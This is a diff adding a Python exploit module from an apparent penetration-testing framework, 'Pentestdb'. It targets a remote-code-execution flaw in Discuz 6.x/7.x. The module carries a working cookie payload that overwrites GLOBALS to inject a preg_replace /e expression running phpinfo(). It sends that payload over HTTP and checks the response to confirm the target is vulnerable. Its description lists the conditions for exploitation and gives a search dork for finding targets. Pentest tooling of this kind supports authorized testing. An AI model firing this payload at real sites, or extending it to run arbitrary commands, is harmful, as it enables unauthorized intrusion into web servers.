@@ -1,0 +1,51 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DiscuzRCE(Exploit):
+    expName = u"Discuz 6.x 7.x cookie GLOBALS变量覆盖RCE"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "6.x 7.x"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2014-080723', 'http://bobao.360.cn/learning/detail/107.html','http://www.secpulse.com/archives/2338.html']
+    description = u'''
+        变量替换、利用preg_replace的/e参数实现远程命令执行
+        漏洞利用条件：
+            1.Discuz 6.x 7.x; 
+            2.php<5.5.0; 
+            3.php.ini request_order = "GP"，php>=5.3默认
+            4.两种利用方式，需要的条件不一样，分别为：
+                viewthread.php?tid=1 帖子或帖子的回复中插入有“表情”
+                announcement.php 有公告信息
+        gh: inurl:viewthread.php
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '_SERVER["HTTP_HOST"]'
+        cookie = "GLOBALS[_DCACHE][smilies][searcharray]=/.*/ei; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();"
+        #cookie = "GLOBALS[_DCACHE][smilies][searcharray]=/.*/eiU; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();"
+        headers = dict()
+        headers['Cookie'] = cookie
+
+        response = self.http.get(self.url, headers=headers)
+        
+        if response.status_code == 200:
+            if sig in response.content:
+                result['fullpath'] = self.url
+                result['payload'] = 'Cookie: '+cookie
+
+        return result
